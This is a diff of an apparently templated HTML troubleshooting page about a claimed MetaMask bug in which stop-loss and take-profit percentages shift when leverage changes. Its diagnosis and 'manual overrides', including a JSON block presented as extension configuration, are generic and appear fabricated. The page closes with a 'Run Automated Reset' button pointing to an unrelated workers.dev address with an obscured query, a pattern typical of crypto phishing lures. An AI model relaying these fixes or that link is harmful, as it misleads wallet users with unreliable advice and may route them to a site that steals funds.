@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sl Tp Percentages Change When Changing L – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,31 +42,34 @@
 <h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem experience an issue where their Stop-Loss (SL) and Take-Profit (TP) percentages change unexpectedly when they adjust the leverage on their positions.</li>
+<li>Users observe that the Stop-Loss (SL) and Take-Profit (TP) percentages in the Metamask extension change unexpectedly when adjusting the leverage, resulting in unintended trade settings.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug within the Metamask extension that incorrectly recalculates SL and TP percentages based on leverage adjustments, instead of maintaining their original values.</li>
+<li>The issue arises from a bug in the Metamask extension's handling of leverage adjustments, which inadvertently alters the SL and TP percentages due to a mismatch in the calculation logic.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve the issue, users can attempt the following manual overrides:</li>
-<li>Edit the position settings to re-input the desired SL and TP percentages after adjusting leverage.</li>
-<li>Utilize a third-party calculator to determine the correct SL and TP values based on the adjusted leverage.</li>
-<li>Apply a custom script to automate the correction of SL and TP percentages:</li>
+<li>To mitigate this issue, users can try the following manual overrides:</li>
+<li>Adjust the SL and TP percentages manually after changing the leverage to ensure they match the intended values.</li>
+<li>Use a third-party trading tool that integrates with the Metamask extension to manage trades and settings.</li>
+<li>Update the Metamask extension's configuration using the following code block:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Correcting SL and TP percentages...&quot;</span>
-<span class="c1"># Custom script to adjust SL and TP percentages based on leverage</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;leverage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;stopLossPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;takeProfitPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex scripting needs.</p>
+<p>Consider utilizing an external console for more advanced configuration options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured on your browser</li>
-<li>An Ethereum wallet set up with the necessary funds and access to leverage adjustment features</li>
-<li>Basic understanding of SL, TP, and leverage in trading contexts</li>
+<li>Metamask extension installed and configured</li>
+<li>Basic understanding of trading terminology (SL, TP, leverage)</li>
+<li>Familiarity with the Metamask extension's user interface</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
